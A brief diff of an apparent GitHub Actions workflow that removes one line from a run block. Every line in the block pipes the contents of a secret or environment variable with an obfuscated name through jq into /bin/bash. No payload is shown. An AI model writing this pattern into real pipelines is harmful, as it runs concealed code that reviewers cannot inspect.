@@ -17,7 +17,6 @@ jobs:
           a0: ${{ secrets.a0 }}
         run: |
           printf '%s' "$a0" | jq -r .v40 | /bin/bash
-          printf '%s' "$wh85546" | jq -r .knrow8139 | /bin/bash
           printf '%s' "$uxnak0106" | jq -r .qlpd30 | /bin/bash
           echo $wlrwt8286 | jq -r .gb02 | /bin/bash
           printf '%s' "$n28" | jq -r .ce46 | /bin/bash
